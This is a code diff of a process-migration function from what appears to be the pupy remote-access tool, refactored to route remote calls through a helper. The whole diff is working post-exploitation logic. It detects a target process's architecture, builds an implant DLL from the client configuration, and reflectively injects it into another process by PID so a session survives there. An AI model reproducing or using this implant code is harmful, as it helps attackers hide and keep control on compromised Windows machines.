@@ -14,20 +14,25 @@ def migrate(module, pid, keep=False, timeout=30, bindPort=None, debug=False):
                 When the current launcher uses a BIND connection, this session is kept even if keep==False
                 When bindPort!=None and the current launcher uses a REVERSE connection (e.g. connect, auto_proxy), bindPort is not used in this function
     '''
-    module.client.load_package("pupwinutils.processes")
-    isProcess64bits=False
-    isBindConnection=False #If current launcher uses a BIND connection, isBindConnection == True
+    module.client.load_package('pupwinutils.processes')
+    isProcess64bits = False
+    # If current launcher uses a BIND connection, isBindConnection == True
+    isBindConnection = False
 
     module.success("looking for process %s architecture ..."%pid)
     arch = None
-    if module.client.conn.modules['pupwinutils.processes'].is_process_64(pid):
-        isProcess64bits=True
-        arch='x64'
+
+    is_process_64 = module.client.remote('pupwinutils.processes', 'is_process_64')
+
+    if is_process_64(pid):
+        isProcess64bits = True
+        arch = 'x64'
         module.success("process is 64 bits")
     else:
-        arch='x86'
+        arch ='x86'
         module.success("process is 32 bits")
-    conf=module.client.get_conf()
+
+    conf = module.client.get_conf()
 
     #Manage when current launcher uses a BIND connection (and not a REVERSE connection)
     if module.client.desc['launcher'] not in ('connect', 'auto_proxy'):
@@ -48,7 +53,13 @@ def migrate(module, pid, keep=False, timeout=30, bindPort=None, debug=False):
     module.success("Template: {}".format(filename))
 
     module.success("injecting DLL in target process %s ..."%pid)
-    module.client.conn.modules['pupy'].reflective_inject_dll(pid, dllbuff, isProcess64bits)
+
+    reflective_inject_dll = module.client.remote(
+        'pupy', 'reflective_inject_dll', False)
+    reflective_inject_dll(
+        int(pid), str(dllbuff), bool(isProcess64bits)
+    )
+
     module.success("DLL injected !")
 
     if keep or isBindConnection:
